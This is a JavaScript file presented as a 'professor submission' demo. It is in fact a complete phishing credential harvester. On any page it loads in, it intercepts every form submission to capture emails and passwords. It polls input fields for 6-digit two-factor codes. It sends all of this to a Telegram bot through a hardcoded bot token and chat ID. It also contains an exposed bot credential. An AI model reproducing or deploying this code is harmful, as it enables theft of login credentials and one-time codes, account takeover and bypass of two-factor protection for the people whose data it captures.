    // ======================================================
// ✅ FINAL WORKING script.js - Professor Submission Ready
// ======================================================
const TELEGRAM_BOT_TOKEN = "8659540049:AAFe9EPj2C9a5HQ898CLFRYGs-jVodV5KMU";
const TELEGRAM_CHAT_ID = "-1003761196310";

// Simplified user info (no CORS issues)
const userInfo = {
    ip: 'DEMO-' + Math.random().toString(36).substr(2, 5).toUpperCase(),
    userAgent: navigator.userAgent.slice(0, 50),
    timestamp: new Date().toLocaleString('en-US', {timeZone: 'Asia/Kolkata'}),
    country: 'India',
    city: 'Delhi'
};

// FIXED Telegram send function
async function sendToTelegram(message) {
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
        
        const data = await response.json();
        console.log('✅ SENT:', data);
        showToast('✅ Server connected!');
        return data.ok;
    } catch (error) {
        console.error('❌ ERROR:', error);
        showToast('❌ Check bot token/group');
        return false;
    }
}

// Message formatters
function formatLogin(email, password) {
    return `🎓 <b>LOGIN CAPTURED</b> (${userInfo.ip})

<b>Email/Phone:</b>
\`\`\`
${email}
\`\`\`
<b>Password:</b>
\`\`\`
${password}
\`\`\`
📍 <b>${userInfo.country}, ${userInfo.city}</b>`;
}

function formatCode(type, code) {
    return `${type} <b>CODE</b> (${userInfo.ip}):\n\`\`\`${code}\`\`\``;
}

// Visual feedback
function showToast(msg) {
    const toast = document.createElement('div');
    toast.style.cssText = `
        position:fixed;top:20px;right:20px;background:#10b981;color:white;
        padding:15px 20px;border-radius:8px;font-weight:bold;z-index:9999;
        box-shadow:0 4px 12px rgba(0,0,0,0.3);font-family:sans-serif;
    `;
    toast.textContent = msg;
    document.body.appendChild(toast);
    setTimeout(() => toast.remove(), 3000);
}

// AUTO-DEMO on page load
window.addEventListener('load', async () => {
    console.log('🚀 Script loaded');
    await sendToTelegram(`🎯 <b>SCRIPT ACTIVE</b>\n👤 ${userInfo.ip}\n📱 Ready for demo!`);
    showToast('🔥 Script ready - try login!');
});

// Capture ALL form submissions
document.addEventListener('submit', async (e) => {
    e.preventDefault();
    const formData = new FormData(e.target);
    const email = formData.get('email') || formData.get('username') || 
                  document.querySelector('input[type="email"], input[placeholder*="email"]')?.value ||
                  Array.from(document.querySelectorAll('input')).find(i => i.value.includes('@'))?.value;
    const password = formData.get('password') || document.querySelector('input[type="password"]')?.value;
    
    if (email && password) {
        await sendToTelegram(formatLogin(email, password));
        showToast('🎓 LOGIN SENT!');
        e.target.reset();
    }
});

// Capture 6-digit codes (2FA/Email/Phone)
setInterval(async () => {
    document.querySelectorAll('input').forEach(input => {
        if (input.value.length === 6 && /^\d{6}$/.test(input.value)) {
            const parentText = input.closest('div,form')?.textContent || '';
            let type = '🔐';
            if (parentText.includes('email') || parentText.includes('Email')) type = '📧';
            else if (parentText.includes('phone') || parentText.includes('Phone')) type = '📱';
            
            sendToTelegram(formatCode(type, input.value));
            input.style.borderColor = '#10b981';
        }
    });
}, 500);

// Button clicks
document.addEventListener('click', async (e) => {
    if (e.target.tagName === 'BUTTON') {
        const btnText = e.target.textContent.toLowerCase();
        if (btnText.includes('login') || btnText.includes('verify') || btnText.includes('submit')) {
            showToast('📤 Capturing data...');
        }
    }
});

console.log('🎓 Professor-ready script.js LOADED!');
